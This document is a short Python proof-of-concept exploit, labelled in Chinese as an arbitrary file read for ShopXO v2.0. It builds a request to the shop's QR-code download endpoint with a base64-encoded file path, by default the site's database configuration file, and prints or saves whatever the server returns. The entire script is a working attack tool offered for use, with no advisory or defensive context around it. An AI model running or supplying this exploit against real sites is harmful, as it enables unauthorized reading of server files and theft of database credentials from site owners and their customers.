'''
shopxo v2.0任意文件读取
'''

import requests
import base64
import argparse

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('index', type=str,
                        help='path of shopxo index')
    parser.add_argument('-f','--filepath', type=str, default='./config/database.php',
                        help='path of the file u wanna read')
    parser.add_argument('-o','--outfile',
                        help='save the result')
    args = parser.parse_args()
    url = getURL(args.index,args.filepath)
    print(url)
    response = requests.post(url=url)
    print(response.text)
    if args.outfile:
        fp = open(args.outfile,'w', encoding='UTF-8')
        fp.write(response.text)
        print('[+] file has saved in ' + args.outfile)


def getURL(url,file):
    if not url.endswith('index.php'):
        print('plz input the correct path of index.php')
        return False
    if file.startswith('/'):
        file = '.' + file
    url = url + '?s=/index/Qrcode/Download&url=' + base64.b64encode(file.encode('utf-8')).decode(
        'utf-8')
    return url

if __name__ == '__main__' :
    main()